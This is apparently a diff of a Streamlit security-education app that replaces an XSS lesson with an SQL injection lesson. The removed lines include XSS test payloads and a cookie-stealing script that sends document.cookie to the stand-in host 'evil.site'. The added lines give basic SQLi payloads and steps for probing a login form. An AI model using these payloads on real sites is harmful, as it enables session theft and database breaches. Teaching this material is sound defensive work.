@@ -27,34 +27,36 @@ Hackers typically find/exploit said vectors through:
 """)
     st.video("https://www.youtube.com/watch?v=SKKVcPjaIqI")
     st.markdown("""
-    5. Inspecting dev tools: Look for unsafe DOM injections.
-
-    Try testing with:
+    5. Inspecting requests:
+    Open browser and use developer tools, check network tabs and submit the form.
+    Then analyse the HTTP request to identify user controlled parameters (username, password, etc)
+    Example captured request
     ```html
-    <svg onload=alert(1)>
-    <img src=x onerror=alert(1)>
+    POST /login
+    username=admin&password=test
     ```
+    Modify these parameters to test for SQL injections:
+    The most basic SQL injections include:
+    ```
+    ' OR 1=1--
+    ' AND 1=2--
+    ```
+    Then observe response differences or timing delays to confirm injection behaviour.
     """)
 
 with tab2:
-    st.subheader("How Hackers Exploit XSS")
+    st.subheader("How Hackers Exploit SQLi vulnerabilities")
     st.markdown("""
-Once an XSS is found, attackers might:
+Once a succesfull SQLi payload is found, attackers might:
 
-- Steal cookies:
-```html
-<script>fetch('https://evil.site?cookie=' + document.cookie)</script>
-```
-- Deface pages:
-```html
-<script>document.body.innerHTML = 'Hacked!'</script>
-```
-- Run keyloggers, crypto miners, or redirect users
-- Use social engineering (e.g., fake login prompts)
+- Use the payload to communicate with a DBMS:
+- Create arbitrary entries to databases connected to the DBMS
+- Dump databases 
+- Subsequently exfiltrate (likely sensitive) data from tables in databases that are connected to the DBMS (i.e, passwords, emails, etc).
 
 Tools often used:
-- Burp Suite (manual testing + fuzzing)
-- BeEF (browser exploitation framework)
+- SQLmap
+- Burp Suite
 """)
 
 
